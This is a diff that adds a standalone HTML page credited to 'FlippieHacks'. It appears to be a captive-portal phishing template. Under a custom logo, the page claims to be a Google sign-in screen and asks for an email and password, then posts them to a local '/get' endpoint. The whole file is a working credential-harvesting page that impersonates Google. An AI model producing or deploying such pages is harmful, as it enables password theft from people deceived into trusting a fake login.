@@ -1,0 +1,145 @@
+<!--By FlippieHacks
+https://github.com/FlippieHacks/ -->
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #003066;
+  margin-right: 100px
+}
+
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #003066;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #003066;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+  margin-top: 10px;
+}
+
+.submit-btn:hover {
+  background: #003066;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="120.000000pt" height="120.000000pt" viewBox="0 0 1200.000000 1200.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,1200.000000) scale(0.100000,-0.100000)"
+fill="#003066" stroke="none">
+<path d="M5615 11993 c-314 -25 -456 -42 -690 -84 -1691 -302 -3179 -1329
+-4072 -2809 -492 -815 -775 -1719 -844 -2689 -15 -217 -6 -816 15 -1011 85
+-771 275 -1424 607 -2090 871 -1745 2552 -2966 4474 -3249 286 -42 428 -53
+776 -58 352 -6 556 3 814 33 1638 193 3112 1042 4110 2369 530 704 908 1548
+1079 2405 92 458 120 781 113 1290 -6 445 -32 701 -108 1082 -205 1025 -673
+1971 -1372 2773 -182 208 -519 532 -752 721 -263 214 -627 454 -942 622 -731
+390 -1513 619 -2348 687 -160 13 -731 19 -860 8z m1113 -3768 l1442 -695 1215
+0 1215 0 0 -470 0 -470 -1209 0 -1208 0 -1157 -562 c-635 -310 -1156 -566
+-1156 -570 0 -5 1064 -8 2365 -8 l2365 0 0 -460 0 -460 -2366 0 c-1301 0
+-2363 -3 -2360 -7 2 -5 682 -318 1510 -698 l1505 -690 -1063 -3 -1062 -2
+-1453 700 -1452 700 -1214 0 -1215 0 0 460 0 460 1212 0 1212 0 1155 556 c636
+305 1160 559 1165 565 6 5 -880 9 -2367 9 l-2377 0 0 470 0 470 2358 0 c1794
+1 2352 3 2337 12 -11 7 -695 321 -1520 700 l-1500 688 1091 0 1090 0 1442
+-695z"/>
+</g>
+</svg>
+
+
+
+  
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in with your Google account</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+	  
+      <button class="submit-btn" type="submit">Continue</button>
+
+    </form>
+
+  </div>
+
+</div>
+</body>
+</html>
